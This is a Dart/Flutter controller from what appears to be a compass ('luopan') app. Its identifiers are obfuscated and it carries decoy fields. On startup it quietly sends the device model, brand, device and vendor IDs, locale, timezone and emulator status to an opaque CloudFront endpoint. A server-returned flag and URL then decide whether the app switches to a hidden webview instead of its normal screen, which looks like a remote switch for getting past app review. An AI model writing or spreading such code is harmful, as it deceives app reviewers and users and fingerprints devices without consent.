import 'dart:io';

import 'package:package_info_plus/package_info_plus.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:get/get.dart';


class LuopanConfigLogic extends GetxController {

  var uxgcjr = RxBool(false);
  var wgbmpkqz = RxBool(true);
  var qbhu = RxString("");
  var zack = RxBool(false);
  var daniel = RxBool(true);
  final clkgarwz = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    fzpi();
  }


  Future<void> fzpi() async {
    zack.value = true;
    daniel.value = true;
    wgbmpkqz.value = false;

    clkgarwz.post("https://d1vdqnvv6p1b8t.cloudfront.net/igcvarftqeljxbphmzynuskwod",data: await yhxdusiq()).then((value) {
      var xkpgqzr = value.data["xkpgqzr"] as String;
      var fsebawnz = value.data["fsebawnz"] as bool;
      if (fsebawnz) {
        qbhu.value = xkpgqzr;
        edyth();
      } else {
        harris();
      }
    }).catchError((e) {
      wgbmpkqz.value = true;
      daniel.value = true;
      zack.value = false;
    });
  }

  Future<Map<String, dynamic>> yhxdusiq() async {
    final DeviceInfoPlugin pnoqyx = DeviceInfoPlugin();
    PackageInfo gbmtek_lvywopes = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var mhcfqkl = Platform.localeName;
    var ltvegp_BUltpvb = currentTimeZone;

    var ltvegp_Rbhdg = gbmtek_lvywopes.packageName;
    var ltvegp_WOHF = gbmtek_lvywopes.version;
    var ltvegp_bDXtL = gbmtek_lvywopes.buildNumber;

    var ltvegp_dCBIV = gbmtek_lvywopes.appName;
    var ltvegp_MU = "";
    var ltvegp_upf  = "";
    var ltvegp_pxwTAVUX = "";
    var jarrodBartoletti = "";
    var jeradWalker = "";
    var rylanHickle = "";
    var sydneeMedhurst = "";
    var jerryWeimann = "";
    var americaSwift = "";
    var mateoWehner = "";
    var tessieHintz = "";


    var ltvegp_UoVKI = "";
    var ltvegp_VWkvi = false;

    if (GetPlatform.isAndroid) {
      ltvegp_UoVKI = "android";
      var caetgsbw = await pnoqyx.androidInfo;

      ltvegp_pxwTAVUX = caetgsbw.brand;

      ltvegp_MU  = caetgsbw.model;
      ltvegp_upf = caetgsbw.id;

      ltvegp_VWkvi = caetgsbw.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ltvegp_UoVKI = "ios";
      var kvlxwtib = await pnoqyx.iosInfo;
      ltvegp_pxwTAVUX = kvlxwtib.name;
      ltvegp_MU = kvlxwtib.model;

      ltvegp_upf = kvlxwtib.identifierForVendor ?? "";
      ltvegp_VWkvi  = kvlxwtib.isPhysicalDevice;
    }

    var res = {
      "ltvegp_dCBIV": ltvegp_dCBIV,
      "ltvegp_bDXtL": ltvegp_bDXtL,
      "ltvegp_WOHF": ltvegp_WOHF,
      "ltvegp_Rbhdg": ltvegp_Rbhdg,
      "ltvegp_MU": ltvegp_MU,
      "ltvegp_BUltpvb": ltvegp_BUltpvb,
      "ltvegp_pxwTAVUX": ltvegp_pxwTAVUX,
      "ltvegp_upf": ltvegp_upf,
      "mhcfqkl": mhcfqkl,
      "ltvegp_UoVKI": ltvegp_UoVKI,
      "ltvegp_VWkvi": ltvegp_VWkvi,
      "jarrodBartoletti" : jarrodBartoletti,
      "jeradWalker" : jeradWalker,
      "rylanHickle" : rylanHickle,
      "sydneeMedhurst" : sydneeMedhurst,
      "jerryWeimann" : jerryWeimann,
      "americaSwift" : americaSwift,
      "mateoWehner" : mateoWehner,
      "tessieHintz" : tessieHintz,

    };
    return res;
  }

  Future<void> harris() async {
    Get.offNamed("/luopan_tab");
  }

  Future<void> edyth() async {
    Get.offNamed("/luopan_session");
  }

}
